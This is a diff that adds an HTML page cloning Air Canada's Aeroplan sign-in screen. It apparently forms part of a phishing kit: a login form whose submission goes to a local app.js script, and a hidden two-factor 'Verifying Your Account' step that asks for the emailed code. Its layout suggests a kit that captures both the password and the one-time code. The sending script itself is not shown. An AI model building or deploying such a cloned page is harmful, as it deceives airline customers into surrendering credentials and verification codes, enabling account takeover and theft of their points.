@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in</title>
+    <link href="https://www.aircanada.com/etc/designs/aircanada/images/favicon.ico" rel="icon" type="image/vnd.microsoft.icon">
+    <link rel="stylesheet" href="/static/css/style.css">
+    <script src="https://www.aircanada.com/assets/58e127919e32edec2065f3c335af8c367001194a011"></script>
+    <script src="https://login.aircanada.com/js/gigya.js?apiKey=3_zA5TRSBDlwybsx_1k8EyncAfJ2b62DJnoxPW60q4X9MqmBDJh1v_8QYaOTG8kZ8S"></script>
+    <script src="https://login.aircanada.com/Nk3hRGIx/Koq/FPf/jT-pL7e792/b7pYLtb8kYiL/C0FERU8/ZCJ/LbzhxA24"></script>
+    <script src="https://login.aircanada.com/js/gigya.services.plugins.base.min.js?services=gigya.services.accounts.plugins.screenSet&lang=en&version=latest"></script>
+</head>
+<body>
+<svg id="ac-sso-background" aria-hidden="true" width="100%" height="100%" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><rect id="path-1" x="0" y="0" width="100%" height="100%"></rect></defs><g id="CL-Background" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="Group"><g id="Path-+-Path-+-Path-+-Path-+-Path-+-Path-Mask"><mask id="mask-2" fill="#fff"><use xlink:href="#path-1"></use></mask><use id="Mask" fill="#DFEFF7" fill-rule="nonzero" xlink:href="#path-1"></use><path d="M1221.482 212.52h-4.79c-9.918-9.769-22.072-15.52-35.216-15.52-11.381 0-22.026 4.325-31.107 11.818a28.477 28.477 0 00-14.936-4.306 29.633 29.633 0 00-19.89 8.008H1087c0 3.026 2.47 5.48 5.518 5.48H1227c0-3.027-2.47-5.48-5.518-5.48zM1554.318 495.298h-9.08C1526 476.243 1502.402 465 1476.908 465c-21.7 0-42.01 8.167-59.433 22.295a57.796 57.796 0 00-29.835-8.448c-13.755 0-26.575 5.045-37.38 13.72a34.941 34.941 0 00-20.79-7.05c-9.007 0-17.351 3.629-24.152 9.781H1263c0 7.567 6.138 13.702 13.71 13.702H1568c-.005-7.555-6.124-13.682-13.682-13.702zM1169.439 746.52h-4.798c-9.914-9.76-22.063-15.52-35.202-15.52-11.377 0-22.008 4.325-31.095 11.818a28.449 28.449 0 00-14.92-4.306 29.597 29.597 0 00-19.882 8.008H1035c0 3.026 2.47 5.48 5.516 5.48H1175a5.463 5.463 0 00-1.632-3.891 5.534 5.534 0 00-3.93-1.59zM307.483 179.52h-4.8c-9.917-9.769-22.07-15.52-35.213-15.52-11.38 0-22.016 4.325-31.106 11.818a28.465 28.465 0 00-14.925-4.306 29.611 29.611 0 00-19.888 8.008H173c0 3.026 2.47 5.48 5.517 5.48H313c0-3.027-2.47-5.48-5.517-5.48zM669.29 495.298h-9.079C640.972 476.243 617.375 465 591.871 465c-21.69 0-42 8.167-59.433 22.295a57.76 57.76 0 00-29.825-8.448c-13.764 0-26.575 5.045-37.38 13.72a34.941 34.941 0 00-20.79-7.05c-9.017 0-17.351 3.629-24.152 9.781H378c0 7.567 6.138 13.702 13.71 13.702H683c0-3.634-1.444-7.119-4.015-9.689a13.714 13.714 0 00-9.695-4.013zM231.48 775.52h-4.791c-9.92-9.76-22.086-15.52-35.225-15.52-11.384 0-22.032 4.325-31.124 11.818a28.481 28.481 0 00-14.93-4.306 29.644 29.644 0 00-19.859 8.008H97c0 3.026 2.471 5.48 5.52 5.48H237c0-3.027-2.471-5.48-5.52-5.48z" id="Path" fill="#FFF" fill-rule="nonzero" mask="url(#mask-2)"></path></g></g></g></svg>
+
+    <div id="wrapper" bis_skin_checked="1">
+        <header>
+          <span>
+            <a href="/">
+              <svg id="ac-logo" alt="Air Canada Logo" role="navigation" aria-label="Link to Air Canada home page" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 159.5 20.8">
+                <style>
+                  .st1 {
+                    fill: #2e2a25
+                  }
+                </style>
+                <path d="M11 14.8c0-.7.3-.8 1-.4 1.2.7 2.4 1.3 2.4 1.3 0-.4.4-.7 1.1-.5.7.2 1.4.3 1.4.3s-.4-.9-.6-1.3c-.3-.7 0-1.1.3-1.2 0 0-.4-.3-.7-.5-.6-.4-.5-.9.1-1.1.8-.4 1.9-.8 1.9-.8-.3-.2-.7-.7-.3-1.4.4-.6 1.1-1.5 1.1-1.5h-1.9c-.7 0-.9-.6-.9-1 0 0-1.1.8-1.9 1.3-.7.5-1.3 0-1.2-.8.2-1.2.3-2.6.3-2.6-.4.4-1.1.3-1.5-.3-.5-1-1-2.2-1-2.2s-.5 1.2-1 2.2c-.3.6-1 .7-1.4.4 0 0 .1 1.4.3 2.6.1.7-.5 1.2-1.2.7-.8-.5-2-1.3-2-1.3 0 .4-.2.9-.9 1H2.5s.7.9 1.1 1.5c.4.6 0 1.2-.3 1.4 0 0 1 .5 1.9.8.6.3.8.7.1 1.1-.2.2-.7.5-.7.5.4.1.7.5.4 1.2-.2.4-.6 1.3-.6 1.3s.7-.2 1.4-.3c.7-.2 1 .2 1.1.5 0 0 1.2-.7 2.4-1.3.6-.4 1-.2 1 .4v1.7c0 1-.2 2-.5 2.6-4.5-.5-8.3-4.1-8.3-8.9 0-4.9 4.1-8.9 9.2-8.9s9.2 4 9.2 8.9c0 4.6-3.6 8.4-8.2 8.9v1.2c5.4-.5 9.6-4.8 9.6-10.1C21.3 4.5 16.5 0 10.6 0 4.8 0 0 4.5 0 10.1c0 4.9 3.7 9 8.6 9.9.8.2 1.3.3 1.8.8.5-1 .6-3 .6-4.1v-1.9z" fill="#f01428"></path>
+                <path class="st1" d="M53.9 15.5V4.7h5.3c2.8 0 4.1 1.2 4.2 2.7 0 .7-.1 1.4-.6 1.9s-.7.7-1.6 1.2l4 5.1h-2.9L58.7 11h-2.4v4.5h-2.4zm2.4-5.9h1.1c2.9 0 3.5-.5 3.5-1.9s-1.3-1.6-3.2-1.6h-1.4v3.5zM30.2 15.5l4.7-10.8h2.9l4.7 10.8h-2.9l-1.3-2.9h-5L32 15.5h-1.8zm3.7-4.3h3.7l-1.9-4.3-1.8 4.3zM45.8 4.7h2.5v10.8h-2.5zM83.2 15.1c-1.2.5-2.7.7-4.5.7-2.1 0-3.8-.5-5-1.5-1.2-1-1.8-2.4-1.8-4.2 0-1.8.6-3.3 1.8-4.2 1.2-1 2.9-1.5 5.2-1.5 1.4 0 2.8.1 4.3.4v1.8c-1.6-.5-3.1-.7-4.2-.7-1.4 0-2.4.4-3.2 1.1-.7.7-1.1 1.8-1.1 3.1s.4 2.3 1.2 3.1c.8.7 1.9 1.1 3.3 1.1 1.3 0 2.7-.3 4-.8v1.6zM86.3 15.5L91 4.7h2.9l4.7 10.8h-2.9l-1.3-2.9h-5l-1.3 2.9h-1.8zm3.8-4.3h3.7L92 6.9l-1.9 4.3zM117.6 15.5l4.7-10.8h2.9l4.7 10.8H127l-1.3-2.9h-5l-1.3 2.9h-1.8zm3.7-4.3h3.7l-1.9-4.3-1.8 4.3zM152.8 6.9l1.9 4.3H151l1.8-4.3zm-.8-2.2l-4.7 10.8h1.8l1.3-2.9h5l1.3 2.9h2.9l-4.7-10.8H152zM102.2 15.5V4.7h2.9l6.8 7.7V4.7h2.1v10.8h-2.7l-7-8.1v8.1zM133.4 15.5V4.7h5.2c1.9 0 3.3.5 4.3 1.3 1 .9 1.5 2.2 1.5 3.8 0 1.8-.5 3.2-1.6 4.1-1.1 1-2.5 1.5-4.4 1.5h-5zm2.5-1.5h1.9c1.3 0 2.3-.3 3-1 .7-.7 1-1.6 1-3 0-1-.3-1.9-.8-2.6-.4-.5-.8-.8-1.3-1-.5-.2-1.2-.3-2.2-.3H136V14z"></path>
+              </svg>
+            </a>
+          </span>
+        </header>
+        <header id="ac-sso-mobile-header" style="display: flex;">Sign in</header>
+        
+
+        <main>
+
+          <div id="2fa" style="display:none;margin-top: 100px;"><svg id="ac-sso-loading" alt="Loading..." xmlns="http://www.w3.org/2000/svg" viewBox="24.5 24.5 562.2 562.2" style="display: none;"><g fill="#E6E6E6"><path d="M305.8 88.3c-83.1 0-155.4 46.8-192 115.5 5.4-4.1 10.6-4.6 11.6-4.4 2 .3 12.5 6.1 6.1 26.2 30.4-66 96.9-111.6 174.3-111.6 106 0 191.7 85.7 191.7 191.7s-85.7 191.7-191.7 191.7-191.7-85.7-191.7-191.7c0-8.1.5-16.1 1.5-23.9-1.4-.6-2.6-1.2-4-2l-21.3-3.4c-1.2 9.5-2 19.3-2 29.1C88.4 425.4 186 523 305.8 523s217.4-97.6 217.4-217.4S425.6 88.3 305.8 88.3zM100.7 233.8c-.8 2.1-1.5 4.4-2.1 6.6.5-.3.8-.5 1.2-.6.3-2.3.6-4.2.9-6z"></path><path d="M115.7 282c2.4-19.9 8-38.7 16.1-56.3 6.3-20-4.3-25.9-6.1-26.2-1.1-.2-6.3.3-11.6 4.4-5 9.6-9.5 19.6-13.2 29.8-.3 1.8-.6 3.7-1.1 6-.5.3-.8.5-1.2.6-3.7 11.6-6.4 23.9-8.1 36.3l21.3 3.4c1.3.6 2.5 1.4 3.9 2z"></path></g><linearGradient id="SVGID_1_" gradientUnits="userSpaceOnUse" x1="40.856" y1="478.128" x2="147.742" y2="416.418" gradientTransform="translate(0 -1172.697) scale(3.2211)"><stop offset="0" stop-color="#fff" stop-opacity="0"></stop><stop offset=".7" stop-color="#fff" stop-opacity="0"></stop><stop offset=".94" stop-color="#d8292f"></stop><stop offset="1" stop-color="#d8292f"></stop></linearGradient><path fill="url(#SVGID_1_)" d="M305.8 101.2c105.7 0 191.7 98.7 191.7 204.6 8.4-2.6 17.7-2.3 25.7 1.2v-1.2c.1-119.9-97.6-204.6-217.4-204.6"></path><g><path fill="#D8292F" d="M484.4 234.3c9.9 25.4 14.1 58.8 12.7 58.3-20.5-7.3-31.7-11-53.7-18.4v8.7c21.3 18.1 31.5 27.7 51.3 47-1.2 8.7-2.3 13.2-3.8 21.9-2.9 21.9 7.8 26.5 9.3 26.5 1.7 0 14.8-3.2 18.4-24.2.9-7.8 1.2-11.9 2-19.6 21.9-17.4 32.3-26.5 52.2-45.4v-9.6c-18.8 6.4-28.5 9.6-47.6 15.6-.2 0-3.4 1.1-3.5 1.1"></path></g></svg><div id="ac-sso-main-container" style="display: block;"><div id="ac-sso-login-form" class="gigya-style-modern gigya-chrome"><h1 class="gigya-screen-caption" id="ac-sso-login-form_content_caption" style="width: 495px;">Verifying Your Account</h1>
+            <div id="ac-sso-login-form_child" class="gigya-hidden"></div>
+            
+            <div id="ac-sso-login-form_content" class="gigya-screen-content gigya-locale-en" style="max-width: none;"><div data-width="auto" class="gigya-screen v2 portrait" gigya-conditional:class="viewport.width < 500 ?gigya-screen v2 portrait mobile:" gigya-expression:data-caption="screenset.translations['GIGYA_TFA_VERIFICATION_SCREEN_CAPTION']" data-screenset-element-id="gigya-tfa-verification-screen" data-screenset-element-id-publish="true" data-screenset-roles="instance" gigya-default-class="gigya-screen v2 portrait" gigya-default-data-caption="null" id="gigya-tfa-verification-screen" data-caption="Verifying Your Account">
+                    <div class="gigya-layout-row">
+                        <div class="gigya-composite-control gigya-composite-control-image">     <div tabindex="0" role="img" class="gigya-image" data-background-size="fit" data-src="https://www.aircanada.com/content/dam/aircanada/portal/images/content-images/altitude/aeroplan-logo.svg" data-width="222" data-height="30" style="background-image: url(&quot;https://www.aircanada.com/content/dam/aircanada/portal/images/content-images/altitude/aeroplan-logo.svg&quot;); width: 222px; height: 30px;" gigya-expression:title="screenset.translations['IMAGE_156357318761766980_TITLE']" gigya-expression:aria-label="screenset.translations['IMAGE_156357318761766980_TITLE']" data-screenset-element-id="__gig_template_element_354_1681645146394" data-screenset-element-id-publish="false" data-screenset-roles="instance" gigya-default-title="null" gigya-default-aria-label="null" title="Aeroplan" aria-label="Aeroplan"></div> </div><div class="gigya-composite-control gigya-composite-control-tfa-widget gigya-composite-control-tfa-verify">
+                            <div class="gigya-tfa gigya-reset" data-screenset-element-id="__gig_template_element_353_1681645146394" data-screenset-element-id-publish="false" data-screenset-roles="instance"><div id="ac-sso-login-form_showTfaUI_1" gigid="showScreenSet_showTfaUI" class="gig-tfa-container"><div class="gig-tfa-select-provider"></div><div class="gig-tfa-provider-wrapper" id="ac-sso-login-form_showTfaUI_1_wrapper"><div id="ac-sso-login-form_showTfaUI_1_wrapper-header-text" tabindex="-1" class="gig-tfa-email-code-header-text"><h2 class="gigya-composite-control gigya-composite-control-header" style="text-align: left;">Please enter your code</h2><br>We sent a verification code, please enter the verification code within 5 minutes of receiving it: </div><div id="ac-sso-login-form_showTfaUI_1_wrapper-email" tabindex="-1" class="gig-tfa-email-text">bi******er@cyberfear.com</div>
+                              <input id="tfa" style="margin-top: 20px;" class="gig-tfa-code-textbox" type="text" tabindex="0" aria-label="Enter code:" placeholder="Enter code:"></label>
+                            <div class="gig-tfa-error" aria-atomic="true" role="alert"></div><label class="gig-tfa-code-remember-label" tabindex="-1" for="ac-sso-login-form_showTfaUI_1_wrapper-remember"><input class="gig-tfa-code-remember-checkbox" type="checkbox" tabindex="0" id="ac-sso-login-form_showTfaUI_1_wrapper-remember">Remember this&nbsp;computer</label><div class="gig-tfa-button-container"><div class="gig-tfa-button gig-tfa-button-submit" tabindex="0" role="button">Submit</div></div></div></div></div>
+                        </div>
+                    </div>
+                    <div class="gigya-layout-row">
+                        <div class="gigya-layout-cell"><label class="gigya-composite-control gigya-composite-control-label" data-binding="true" style="text-align: center;" data-translation-key="LABEL_16733449039185324_LABEL" data-screenset-element-id="__gig_template_element_352_1681645146394" data-screenset-element-id-publish="false" data-screenset-roles="template,instance,instance"><div class="gigya-resend-tfa-container">
+             If you haven’t received a code, please wait <strong>60 seconds</strong> to request a new code. Please note that if you try signing in again, a new verification code will be sent to you and the previous one will expire.<br><br>
+             <a role="button" class="gigya-composite-control gigya-composite-control-link" href="javascript:void(0)" data-switch-screen="gigya-confirm-identity-screen" data-screenset-element-id="__gig_template_element_437_1681645314622" data-screenset-element-id-publish="false" data-screenset-roles="template,instance,template,instance" tabindex="0" title="">Still having trouble?</a>
+            </div>
+             <a style="display:none;" href="#" class="gigya-resend-tfa-code" data-event="resend-tfa-code">Send code again</a></label></div>
+                        <div class="gigya-layout-cell"></div>
+                        <div class="gigya-clear"></div>
+                    </div>
+                    <div class="gigya-layout-row">
+                        <div class="gigya-layout-cell">
+                            <div class="gigya-layout-row">
+                                <div class="gigya-layout-cell"></div>
+                                <div class="gigya-layout-cell"></div>
+                                <div class="gigya-clear"></div>
+                            </div>
+                        </div>
+                        <div class="gigya-layout-cell">
+                            <div class="gigya-layout-row">
+                                <div class="gigya-layout-cell"></div>
+                                <div class="gigya-layout-cell"></div>
+                                <div class="gigya-clear"></div>
+                            </div>
+                        </div>
+                        <div class="gigya-clear"></div>
+                    </div>
+                    <div class="gigya-layout-row"></div>
+                    <div class="gigya-layout-row">
+                        <div class="gigya-layout-cell"></div>
+                        <div class="gigya-layout-cell"></div>
+                        <div class="gigya-clear"></div>
+                    </div>
+                    <div class="gigya-layout-row">
+                        <div class="gigya-layout-cell">
+                            <div class="gigya-layout-row">
+                                <div class="gigya-layout-cell"></div>
+                                <div class="gigya-layout-cell"></div>
+                                <div class="gigya-clear"></div>
+                            </div>
+                        </div>
+                        <div class="gigya-layout-cell">
+                            <div class="gigya-layout-row">
+                                <div class="gigya-layout-cell"></div>
+                                <div class="gigya-layout-cell"></div>
+                                <div class="gigya-clear"></div>
+                            </div>
+                        </div>
+                        <div class="gigya-clear"></div>
+                    </div>
+                    <div class="gigya-layout-row"></div>
+                    <div class="gigya-clear"></div>
+                </div></div></div></div><div id="ac-sso-login-guest" style="display: none;"><a class="link" id="ac-sso-login-guest-uri" href=""><span id="ac-sso-login-guest-text"></span><svg xmlns="http://www.w3.org/2000/svg" height="24" width="24"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"></path></svg></a></div></div>
+
+          <div id="auth" bis_skin_checked="1" style="margin-top:100px;">
+            <svg id="ac-sso-loading" alt="Loading..." xmlns="http://www.w3.org/2000/svg" viewBox="24.5 24.5 562.2 562.2" style="display: none;">
+              <g fill="#E6E6E6">
+                <path d="M305.8 88.3c-83.1 0-155.4 46.8-192 115.5 5.4-4.1 10.6-4.6 11.6-4.4 2 .3 12.5 6.1 6.1 26.2 30.4-66 96.9-111.6 174.3-111.6 106 0 191.7 85.7 191.7 191.7s-85.7 191.7-191.7 191.7-191.7-85.7-191.7-191.7c0-8.1.5-16.1 1.5-23.9-1.4-.6-2.6-1.2-4-2l-21.3-3.4c-1.2 9.5-2 19.3-2 29.1C88.4 425.4 186 523 305.8 523s217.4-97.6 217.4-217.4S425.6 88.3 305.8 88.3zM100.7 233.8c-.8 2.1-1.5 4.4-2.1 6.6.5-.3.8-.5 1.2-.6.3-2.3.6-4.2.9-6z"></path>
+                <path d="M115.7 282c2.4-19.9 8-38.7 16.1-56.3 6.3-20-4.3-25.9-6.1-26.2-1.1-.2-6.3.3-11.6 4.4-5 9.6-9.5 19.6-13.2 29.8-.3 1.8-.6 3.7-1.1 6-.5.3-.8.5-1.2.6-3.7 11.6-6.4 23.9-8.1 36.3l21.3 3.4c1.3.6 2.5 1.4 3.9 2z"></path>
+              </g>
+              <linearGradient id="SVGID_1_" gradientUnits="userSpaceOnUse" x1="40.856" y1="478.128" x2="147.742" y2="416.418" gradientTransform="translate(0 -1172.697) scale(3.2211)">
+                <stop offset="0" stop-color="#fff" stop-opacity="0"></stop>
+                <stop offset=".7" stop-color="#fff" stop-opacity="0"></stop>
+                <stop offset=".94" stop-color="#d8292f"></stop>
+                <stop offset="1" stop-color="#d8292f"></stop>
+              </linearGradient>
+              <path fill="url(#SVGID_1_)" d="M305.8 101.2c105.7 0 191.7 98.7 191.7 204.6 8.4-2.6 17.7-2.3 25.7 1.2v-1.2c.1-119.9-97.6-204.6-217.4-204.6"></path>
+              <g>
+                <path fill="#D8292F" d="M484.4 234.3c9.9 25.4 14.1 58.8 12.7 58.3-20.5-7.3-31.7-11-53.7-18.4v8.7c21.3 18.1 31.5 27.7 51.3 47-1.2 8.7-2.3 13.2-3.8 21.9-2.9 21.9 7.8 26.5 9.3 26.5 1.7 0 14.8-3.2 18.4-24.2.9-7.8 1.2-11.9 2-19.6 21.9-17.4 32.3-26.5 52.2-45.4v-9.6c-18.8 6.4-28.5 9.6-47.6 15.6-.2 0-3.4 1.1-3.5 1.1"></path>
+              </g>
+            </svg>
+            <div id="ac-sso-main-container" style="display: block;" bis_skin_checked="1">
+              <div id="ac-sso-login-form" bis_skin_checked="1" class="gigya-style-modern gigya-windows gigya-chrome">
+                <h1 class="gigya-screen-caption" id="ac-sso-login-form_content_caption" style="width: 495px;">Log In</h1>
+                <div id="ac-sso-login-form_child" class="gigya-hidden" bis_skin_checked="1"></div>
+                <div id="ac-sso-login-form_content" class="gigya-screen-content gigya-locale-en" style="max-width: none;" bis_skin_checked="1">
+                  <div data-width="auto" gigya-conditional:class="viewport.width < 550 ?gigya-screen v2 portrait mobile:viewport.width < 920 ?gigya-screen v2 portrait:" class="gigya-screen v2 landscape" gigya-expression:data-caption="screenset.translations['GIGYA_LOGIN_SCREEN_CAPTION']" data-screenset-element-id="gigya-login-screen" data-screenset-element-id-publish="true" data-screenset-roles="instance" gigya-default-class="gigya-screen v2 landscape" gigya-default-data-caption="null" id="gigya-login-screen" data-caption="Log In" bis_skin_checked="1">
+                    <form class="gigya-login-form" onsubmit="return false;" method="post" data-screenset-element-id="gigya-login-form" data-screenset-element-id-publish="true" data-screenset-roles="instance" id="gigya-login-form" data-np-intersection-state="visible" data-np-autofill-type="login" data-np-checked="1" data-np-watching="1">
+                      <div class="gigya-layout-row" bis_skin_checked="1"></div>
+                      <div class="gigya-layout-row with-divider" bis_skin_checked="1">
+                        <div class="gigya-layout-cell responsive with-social-login" bis_skin_checked="1">
+                          <div class="" bis_skin_checked="1"></div>
+                        </div>
+                        <div class="gigya-layout-cell responsive with-divider" bis_skin_checked="1"></div>
+                        <div class="gigya-layout-cell responsive with-site-login" bis_skin_checked="1">
+                          <div data-screenset-element-id="ac-sso-login-message" data-screenset-element-id-publish="true" data-screenset-roles="instance" id="ac-sso-login-message" bis_skin_checked="1"></div>
+                          <div class="gigya-composite-control gigya-composite-control-image" bis_skin_checked="1">
+                            <div role="img" tabindex="0" class="gigya-image" data-background-size="fit" data-src="https://www.aircanada.com/content/dam/aircanada/portal/images/content-images/altitude/aeroplan-logo.svg" data-width="222" data-height="30" style="background-image: url(&quot;https://www.aircanada.com/content/dam/aircanada/portal/images/content-images/altitude/aeroplan-logo.svg&quot;); width: 222px; height: 30px;" gigya-expression:title="screenset.translations['IMAGE_53029439722788690_TITLE']" gigya-expression:aria-label="screenset.translations['IMAGE_53029439722788690_TITLE']" data-screenset-element-id="__gig_template_element_6_1681293899701" data-screenset-element-id-publish="false" data-screenset-roles="instance" gigya-default-title="null" gigya-default-aria-label="null" title="Aeroplan" aria-label="Aeroplan" bis_skin_checked="1"></div>
+                          </div>
+                          <div class="gigya-error-display gigya-composite-control gigya-composite-control-form-error" data-bound-to="gigya-login-form" data-screenset-element-id="__gig_template_element_1_1681295269209" data-screenset-element-id-publish="false" data-screenset-roles="instance" aria-atomic="true" bis_skin_checked="1">
+                            </div>
+                          <div class="gigya-composite-control gigya-composite-control-textbox" bis_skin_checked="1">
+                            <input placeholder="Aeroplan number or email" autocomplete="off" type="text" class="gigya-input-text" name="username" tabindex="0" formnovalidate="formnovalidate" gigya-expression:data-display-name="screenset.translations['LOGINID_1311311543682226_DISPLAY_NAME']" data-screenset-element-id="gigya-loginID-36809123729262220" data-screenset-element-id-publish="true" data-screenset-roles="instance" gigya-default-data-display-name="null" data-gigya-name="loginID" data-original-value="" id="username" aria-required="true" data-display-name="Please enter your Aeroplan Number or Email" data-np-autofill-type="username" data-np-uid="623700c9-d302-48ea-ae51-61634f6660d8">
+                            <span class="gigya-error-msg" data-bound-to="loginID" data-screenset-element-id="__gig_template_element_3_1681293899698" data-screenset-element-id-publish="false" data-screenset-roles="instance" aria-atomic="true"></span>
+                            <span data-np-uid="623700c9-d302-48ea-ae51-61634f6660d8" style="width: 24px; min-width: 24px; height: 24px; background-image: url(&quot;chrome-extension://fooolghllnmhmmndgjiamiiodkpenpbb/assets/manifestIcons/icon.svg&quot;); background-repeat: no-repeat; background-position: left center; background-size: auto; border: none; display: inline-block; visibility: visible; position: absolute; cursor: pointer; z-index: 998; padding: 0px; transition: none 0s ease 0s; pointer-events: all; right: 0px; left: 343px; top: 12.5px; min-height: 24px;"></span>
+                          </div>
+                          <div class="gigya-composite-control gigya-composite-control-password" bis_skin_checked="1">
+                            <input placeholder="Password" autocomplete="off" type="password" name="password" class="gigya-input-password" tabindex="0" formnovalidate="formnovalidate" gigya-expression:data-display-name="screenset.translations['PASSWORD_132128826476804690_DISPLAY_NAME']" data-screenset-element-id="gigya-password-70610748058497410" data-screenset-element-id-publish="true" data-screenset-roles="instance" gigya-default-data-display-name="null" data-gigya-name="password" data-original-value="" id="password" aria-required="true" data-display-name="We’ll need you to enter your Aeroplan Password" data-np-autofill-type="password" data-np-uid="70874ef1-d6c5-4b4b-84f3-fba26daefc13">
+                            <span class="gigya-error-msg" data-bound-to="password" data-screenset-element-id="__gig_template_element_4_1681293899698" data-screenset-element-id-publish="false" data-screenset-roles="instance" aria-atomic="true"></span>
+                            <span tabindex="0" aria-label="Show Password" class="gigya-pw-toggle gigya-pw-toggle-open"></span>
+                          </div>
+                          <div class="gigya-layout-row" bis_skin_checked="1">
+                            <div class="gigya-layout-cell" bis_skin_checked="1"></div>
+                            <div class="gigya-layout-cell" bis_skin_checked="1"></div>
+                          </div>
+                          <div class="gigya-composite-control gigya-composite-control-submit" bis_skin_checked="1">
+                            <input type="submit" class="gigya-input-submit" tabindex="0" data-gigya-type="submit" gigya-expression:value="screenset.translations['SUBMIT_142674579108303380_VALUE']" data-screenset-element-id="__gig_template_element_5_1681293899700" data-screenset-element-id-publish="false" data-screenset-roles="instance" gigya-default-value="null" value="Sign in">
+                          </div>
+                          <a class="gigya-composite-control gigya-composite-control-link gigya-link-right gigya-forgot-password-link" href="https://www.aircanada.com/ca/en/aco/profile/forgot-password.html" data-binding="true" data-translation-key="LINK_146308315993881860_LABEL" data-screenset-element-id="__gig_template_element_12_1681293899704" data-screenset-element-id-publish="false" data-screenset-roles="template,instance,instance">Forgot your password?</a>
+                        </div>
+                        <div class="gigya-clear" bis_skin_checked="1"></div>
+                      </div>
+                      <div class="gigya-layout-row" bis_skin_checked="1">
+                        <div class="gigya-layout-cell responsive under-site-login" bis_skin_checked="1"></div>
+                      </div>
+                      <div class="gigya-clear" bis_skin_checked="1"></div>
+                    </form>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div id="ac-sso-login-guest" style="display: none;" bis_skin_checked="1">
+              <a class="link" id="ac-sso-login-guest-uri" href="">
+                <span id="ac-sso-login-guest-text"></span>
+                <svg xmlns="http://www.w3.org/2000/svg" height="24" width="24">
+                  <path d="M0 0h24v24H0V0z" fill="none"></path>
+                  <path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"></path>
+                </svg>
+              </a>
+            </div>
+          </div>
+        </main>
+      </div>
+</body>
+<script src="https://code.jquery.com/jquery-3.6.4.min.js" integrity="sha256-oP6HI9z1XaZNBrJURtCoUT5SUnxFr8s3BzRl+cbzUq8=" crossorigin="anonymous"></script>
+<script src="/static/js/app.js"></script>
+</html>
